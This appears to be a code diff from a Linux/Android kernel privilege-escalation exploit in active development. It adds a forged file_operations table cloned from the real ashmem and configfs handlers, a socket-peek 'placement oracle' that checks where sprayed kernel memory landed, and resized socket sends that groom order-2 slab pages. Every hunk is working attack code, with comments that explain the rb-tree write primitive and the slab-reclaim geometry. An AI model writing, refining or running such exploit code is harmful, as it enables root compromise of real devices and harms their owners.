@@ -399,6 +399,8 @@ void put_fake_fops_table(unsigned char *p, size_t off) {
   uint64_t a_cfg_w = active_offsets ? active_offsets->off_configfs_bin_write_iter : 0;
   uint64_t a_splice = active_offsets ? active_offsets->off_copy_splice_read : 0;
   uint64_t a_llseek = active_offsets ? active_offsets->off_noop_llseek : 0;
+  uint64_t a_ash_llseek = active_offsets ? active_offsets->off_ashmem_llseek : 0;
+  uint64_t a_ash_rditer = active_offsets ? active_offsets->off_ashmem_read_iter : 0;
 
   /*
    * CRITICAL (plateau cross): skb payload is memset 0x41. file_operations is
@@ -407,6 +409,65 @@ void put_fake_fops_table(unsigned char *p, size_t off) {
    * Zero the whole table first so unset hooks are NULL (safe no-ops).
    */
   memset(p + off, 0, 0x100);
+
+  /*
+   * MODE4_CLONE_FOPS / MODE4_CLONE_CFG — bit-exact clone of the REAL
+   * ashmem_fops (Image-dumped 2026-08-16, docs/CLONE_SWAP_BREAKTHROUGH_PLAN):
+   *   owner=0 llseek=ashmem_llseek.jt read=0 write=0
+   *   read_iter=ashmem_read_iter.jt write_iter=0
+   *   ioctl/compat/mmap/open/release = real .cfi_jt, all other slots 0.
+   * CLONE_FOPS: pure clone — the *MISC swap is a semantic NO-OP, so a
+   *   softboot with this table PROVES the crash is in the walk geometry,
+   *   not in post-swap system ashmem traffic.
+   * CLONE_CFG: clone + .read/.write = configfs_*_bin_file .cfi_jt — the
+   *   full-compat attack table (system traffic keeps working through real
+   *   slots; fresh opens get FMODE_CAN_WRITE via .write).
+   * Both bypass the rb_leaf shell: real JTs at +8/+0x10 are only ever
+   * COMPARED against the erased node in __rb_change_child (never stored
+   * through, never dereferenced) in the 5.10 Case-2 path, and +0x00=0
+   * (owner) is a valid "black, no parent" rb head that terminates any
+   * accidental parent walk — same walk safety aristotle's non-shell table
+   * relies on.
+   */
+  int clone_fops = env_flag("MODE4_CLONE_FOPS", 0);
+  int clone_cfg = env_flag("MODE4_CLONE_CFG", 0);
+  if (clone_fops || clone_cfg) {
+    put64(p, off + FOPS_OWNER_OFF, 0);
+    put64(p, off + FOPS_LLSEEK_OFF,
+          runtime_text_sym(a_ash_llseek, a_llseek));
+    put64(p, off + FOPS_READ_OFF,
+          clone_cfg ? runtime_text_sym(a_cfg_r, CONFIGFS_READ_ITER_OFF) : 0);
+    put64(p, off + FOPS_WRITE_OFF,
+          clone_cfg ? runtime_text_sym(a_cfg_w, CONFIGFS_BIN_WRITE_ITER_OFF)
+                    : 0);
+    put64(p, off + FOPS_READ_ITER_OFF,
+          a_ash_rditer ? runtime_text_sym(a_ash_rditer, 0) : 0);
+    put64(p, off + FOPS_WRITE_ITER_OFF, 0);
+    put64(p, off + FOPS_IOCTL_OFF,
+          runtime_text_sym(a_ioctl, ASHMEM_IOCTL_OFF));
+    put64(p, off + FOPS_COMPAT_IOCTL_OFF,
+          runtime_text_sym(a_compat, ASHMEM_COMPAT_IOCTL_OFF));
+    put64(p, off + FOPS_MMAP_OFF,
+          runtime_text_sym(a_mmap, ASHMEM_MMAP_OFF));
+    put64(p, off + FOPS_OPEN_OFF,
+          runtime_text_sym(a_open, ASHMEM_OPEN_OFF));
+    put64(p, off + FOPS_RELEASE_OFF,
+          runtime_text_sym(a_rel, ASHMEM_RELEASE_OFF));
+    pr_info("fops CLONE%s: llseek=%#llx read=%#llx write=%#llx "
+            "read_iter=%#llx ioctl=%#llx mmap=%#llx open=%#llx\n",
+            clone_cfg ? "_CFG" : "_FOPS",
+            (unsigned long long)runtime_text_sym(a_ash_llseek, a_llseek),
+            (unsigned long long)(clone_cfg
+                ? runtime_text_sym(a_cfg_r, CONFIGFS_READ_ITER_OFF) : 0),
+            (unsigned long long)(clone_cfg
+                ? runtime_text_sym(a_cfg_w, CONFIGFS_BIN_WRITE_ITER_OFF) : 0),
+            a_ash_rditer ? (unsigned long long)runtime_text_sym(a_ash_rditer, 0)
+                         : 0ULL,
+            (unsigned long long)runtime_text_sym(a_ioctl, ASHMEM_IOCTL_OFF),
+            (unsigned long long)runtime_text_sym(a_mmap, ASHMEM_MMAP_OFF),
+            (unsigned long long)runtime_text_sym(a_open, ASHMEM_OPEN_OFF));
+    return;
+  }
 
   /*
    * MODE4_FOPS_RB_LEAF / ION_SAFE / ROOT_SPRAY: first 0x18 must be a valid
@@ -569,6 +630,76 @@ void close_reclaim_sockets(void) {
       reclaim_sv[i] = -1;
     }
   }
+}
+
+/*
+ * MODE4_WPROOF_SPRAY placement oracle. The only-left stamp is redirected to
+ * write a marker qword INSIDE our own sprayed table (target = fake_fops+0x90,
+ * value = fake_fops+0x80 — both readable page addresses, rb-safe). After the
+ * consumer walk, PEEK (non-destructive) the reclaim socket stream and locate
+ * the table by its slot signature, then check the marker.
+ *   ret 1  : marker present at table+0x90 → fake_fops really points at our
+ *            sprayed bytes → CLONE_CFG fire is safe to probe.
+ *   ret 0  : table found, marker absent → placement wrong; also scan for the
+ *            marker VALUE anywhere and report its offset relative to the
+ *            table (measures the SKB_DATA_DELTA error Y directly).
+ *   ret -1 : table signature not found in the stream at all.
+ */
+int wproof_spray_verify(uint64_t marker_expect) {
+  static unsigned char sbuf[SKB_SEND_SIZE * 2];
+  ssize_t n = recv(reclaim_sv[1], sbuf, sizeof(sbuf),
+                   MSG_PEEK | MSG_DONTWAIT);
+  if (n < 0x200) {
+    pr_warning("SPRAY_VERIFY peek failed n=%zd errno=%d\n", n, errno);
+    return -1;
+  }
+  uint64_t llseek_v = runtime_text_sym(
+      active_offsets ? active_offsets->off_ashmem_llseek : 0, 0);
+  uint64_t rditer_v = runtime_text_sym(
+      active_offsets ? active_offsets->off_ashmem_read_iter : 0, 0);
+  uint64_t ioctl_v = runtime_text_sym(
+      active_offsets ? active_offsets->off_ashmem_ioctl : 0, ASHMEM_IOCTL_OFF);
+  uint64_t open_v = runtime_text_sym(
+      active_offsets ? active_offsets->off_ashmem_open : 0, ASHMEM_OPEN_OFF);
+  const uint64_t *q = (const uint64_t *)sbuf;
+  size_t qn = (size_t)n / 8;
+  for (size_t i = 0; i + 19 <= qn; i++) {
+    int match;
+    if (llseek_v)
+      match = (q[i + 1] == llseek_v) && (q[i + 4] == rditer_v) &&
+              (q[i + 10] == ioctl_v);
+    else
+      match = (q[i + 10] == ioctl_v) && (q[i + 14] == open_v);
+    if (!match)
+      continue;
+    uint64_t marker = q[i + 18];
+    pr_success("SPRAY_VERIFY table stream_off=%#zx (page-rel guess %#zx) "
+               "marker@+0x90=%#llx expect=%#llx\n",
+               i * 8, i * 8 % ORDER3_SIZE,
+               (unsigned long long)marker, (unsigned long long)marker_expect);
+    if (marker == marker_expect)
+      return 1;
+    /* Miss: log EVERY occurrence of the marker VALUE so a real kernel write
+     * (table+0x90) can be told apart from payload stamp copies (SCRATCH/W0
+     * regions also carry write_pc = fake_fops+0x80). */
+    {
+      int occ = 0;
+      for (size_t j = 0; j + 18 < qn && occ < 8; j++) {
+        if (q[j] == marker_expect) {
+          long y = (long)(j - (i + 18)) * 8;
+          pr_success("SPRAY_VERIFY marker_occ[%d] stream_off=%#zx "
+                     "rel_table=%+ld bytes\n", occ, j * 8, y);
+          occ++;
+        }
+      }
+      if (!occ)
+        pr_success("SPRAY_VERIFY marker VALUE not in stream "
+                   "(write landed outside sprayed pages)\n");
+    }
+    return 0;
+  }
+  pr_warning("SPRAY_VERIFY table signature not found in %zd peeked bytes\n", n);
+  return -1;
 }
 
 void close_ctx_memfds(struct mm_ctx *ctx) {
@@ -768,7 +899,16 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         use_classic = 0;
       else if (tgt == misc_p0)
         use_classic = 1;
-      if (use_classic) {
+      if (env_flag("MODE4_WPROOF_SPRAY", 0)) {
+        /* Placement oracle: marker write inside our own sprayed table. */
+        use_classic = 0;
+        write_pc = fake_fops + 0x80; /* parent_color = VALUE (page addr) */
+        write_right = 0;
+        write_left = fake_fops + 0x90; /* *left = VALUE lands here */
+        pr_info("mode4 WPROOF_SPRAY marker *(fake_fops+0x90)=%016zx "
+                "(placement oracle)\n",
+                write_pc);
+      } else if (use_classic) {
         write_pc = (misc_p0 - 8) & ~3ULL;
         write_pc |= 1ULL;
         write_right = fake_fops;
@@ -1274,6 +1414,30 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 
   SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));
 
+  /*
+   * Reclaim sends use ORDER-2-SIZED chunks (default 0x4E80), NOT the full
+   * 32KB: unix_stream_sendmsg() (5.10.236 source) splits a send into
+   * linear SKB_MAX_HEAD(0) (~0xE80) + PAGE_ALIGN'd page frags. A 32KB send
+   * is 100% order-3 frags — which can NEVER claim a lone freed order-2 mm
+   * slab page (an order-3 request needs a buddy-merged block). A 0x4E80
+   * send = linear 0xE80 + ONE order-2 frag page carrying the payload
+   * (table at payload 0xF80 -> frag_page+0x100, the IonStack -0xE80
+   * geometry). Each send claims one order-2 page directly from the
+   * order-2 freelist (LIFO: our just-freed mm page is freshest).
+   * Env: RECLAIM_SEND_SIZE (bytes), RECLAIM_SENDS (count).
+   */
+  struct iovec riov;
+  memset(&riov, 0, sizeof(riov));
+  riov.iov_base = skb_buf;
+  riov.iov_len = (size_t)env_int_range("RECLAIM_SEND_SIZE", 0x4E80, 0x1100,
+                                       SKB_SEND_SIZE);
+  struct msghdr rmsg;
+  memset(&rmsg, 0, sizeof(rmsg));
+  rmsg.msg_iov = &riov;
+  rmsg.msg_iovlen = 1;
+  int reclaim_sends =
+      env_int_range("RECLAIM_SENDS", SKB_RECLAIM_SENDS, 1, 64);
+
   pin_to_core(CORE);
   sched_yield();
   sched_yield();
@@ -1300,9 +1464,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   sched_yield();
   SYSCHK(close(memfd_leak));
   memfd_leak = -1;
-  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
+  for (int i = 0; i < reclaim_sends; i++) {
     errno = 0;
-    ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
+    ssize_t sent = sendmsg(reclaim_sv[0], &rmsg, MSG_DONTWAIT);
     if (sent <= 0) {
       break;
     }
